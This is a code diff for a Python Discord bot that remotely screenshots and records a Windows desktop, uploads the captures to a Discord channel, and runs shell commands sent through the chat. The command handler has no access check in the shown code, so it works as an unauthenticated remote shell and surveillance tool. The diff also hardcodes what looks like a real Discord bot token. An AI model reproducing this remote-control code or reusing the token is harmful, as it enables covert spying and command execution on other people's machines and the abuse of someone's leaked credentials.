@@ -1,18 +1,14 @@
 import pyautogui
 import time
-from Modules import ScreenRecordModule
+import ffmpeg
 import discord
 from discord.ext import commands
 import os
 
 
-
+MY_TOKEN = "ODYyNzI3Mjk0MDUyMDczNTEy.GS0RiI.2zA2troKzd-IzspDNcvsExJlmDmNZjnB_t6I54"
 TOKEN = "PASTE_YOUR_DISCORD_BOT_TOKEN_HERE"
-WARNING = """
-Warning! this method of recording is VERY unstable at the moment. I can currently do 25 fps @ 
-5 seconds comfortably, and reccomend only recording in 25 second long chunks, framse are stored 
-in MEMORY at the moment and not physical storage so for that reason please excerise caution
-"""
+
 
 intents = discord.Intents.all()                         # intents variable for the bots intents
 bot = commands.Bot(command_prefix='?', intents=intents) # bot variable holding the bot class
@@ -45,15 +41,19 @@ async def screenshotCommand(interaction:discord.Interaction, delay:int=0):
 
 
 @tree.command(name="record", description="Records the screen for a set duration and framerate")
-async def recordCommand(interaction:discord.Interaction, duration:int=5):
-    await interaction.channel.send(WARNING)                             # Sends a warning message to the channel
-    await interaction.response.defer()                                  # defers the interaction just in case of delay, which there will be
-    SRM = ScreenRecordModule()                                          # initilize the module
-    SRM.recordScreen(duration)                                          # record the screen
-    await wait(3+duration)                                              # wait the duration of the recording plus a few extra seconds
-    await interaction.followup.send(
-        file=discord.File("output.avi"))                                # find the file and send it
-    os.remove("output.avi")                                             # removes the file from the computer
+async def recordCommand(interaction:discord.Interaction, duration:int=5, frame_rate:int=30):
+    await interaction.response.defer()                                        # defer the interaction, we are recording video there will be a delay
+    await interaction.channel.send("The recording has" 
+                                   f"started and will last for {duration}")   # let the user know we started recording
+    (
+        ffmpeg.input("desktop",f="gdigrab", s="1920x1080")                    # record the desktop, with windows gdigrab, and resoultion
+        .output("output.mp4", r=frame_rate, t=duration,                       # set the output presets, like the framerate, duration, etc
+                preset="ultrafast")                                           # thanks to uwufer_gaylord on discord to helping me figure out ffmpeg command LOL (I never used it and didnt understand the flags)
+        .run()                                                                # run the process
+    ) 
+    file = discord.File("output.mp4")                                         # create a file object
+    await interaction.followup.send(file=file)                                # send that file
+    os.remove("output.mp4")                                                   # claen up our mess
 
 
 
@@ -61,6 +61,7 @@ async def recordCommand(interaction:discord.Interaction, duration:int=5):
 @tree.command(name="command", description="Runs a Command Line Interface (CLI) command")
 async def commandlineCommand(interaction:discord.Interaction, command:str):
     result = os.popen(command).read()
+    if result == "": await interaction.response.send_message("Done!"); return
     await interaction.response.send_message(f"Done! result : `{result}`")
 
 
